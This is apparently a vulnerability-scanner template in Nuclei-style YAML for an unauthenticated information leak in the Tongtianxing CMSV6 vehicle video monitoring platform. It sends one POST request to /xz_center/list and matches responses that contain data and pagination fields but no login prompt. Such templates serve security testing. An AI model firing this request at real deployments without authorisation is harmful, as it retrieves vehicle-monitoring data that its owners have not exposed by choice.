script_name: 通天星CMSV6车载视频监控平台 list信息泄露
content:
id: tongtianxing-cmsv6-xz-center-list-info-leak

info:
  name: 通天星CMSV6车载视频监控平台 list信息泄露漏洞
  author: hyy
  severity: high
  description: |
    通天星CMSV6车载视频监控平台list存在信息泄露漏洞
  reference:
    - https://cwe.mitre.org/data/cwe.html
    - https://portswigger.net/web-security/file-disclosure
  tags: 808gps,logger,info-leak,unauth,iot,vehicle-monitor,json
  metadata:
    verified: true
    source: manual-analysis

    max-redirects: 2
    timeout: 10
    skip-verification: true

requests:
  - method: POST
    path:
      - "{{BaseURL}}/xz_center/list"

    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
      Connection: close

    body: "page=1"

    matchers:
      - type: status
        status:
          - 200
        condition: and

      - type: word
        words:
          - "result"
          - "message"
          - "data"
          - "currentPage"
          - "totalRecords"
          - "startRecord"
          - "endRecord"
        encoding: utf8
        part: body
        condition: and

      - type: word
        words:
          - "用户未登录"
          - "无权访问"
          - "Access Denied"
          - "Not Authorized"
          - "login"
          - "请先登录"
        negative: true
        part: body

# 所有 matcher 必须同时满足
    matchers-condition: and
